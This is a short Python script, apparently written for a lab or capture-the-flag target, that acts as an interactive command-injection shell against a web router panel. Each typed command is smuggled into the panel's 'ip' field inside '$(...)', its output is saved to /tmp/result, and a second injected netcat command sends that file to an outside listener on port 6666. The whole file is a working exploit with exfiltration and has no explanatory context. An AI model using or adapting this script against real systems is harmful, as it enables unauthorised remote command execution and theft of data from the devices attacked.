import requests
import subprocess

url = 'http://10.10.202.203/myrouterpanel/'
ip = '10.11.73.42'
port = '6666'

if __name__ == '__main__':
    while (command := input()) != 'exit':
        data = {"ip": '$(' + command + ' > /tmp/result' + ')'}
        _ = requests.post(url,data=data)
        data = {"ip":'$(' + 'nc ' + ip + ' ' + port + ' < /tmp/result)'}
        response = requests.post(url,data=data)
        print(response)

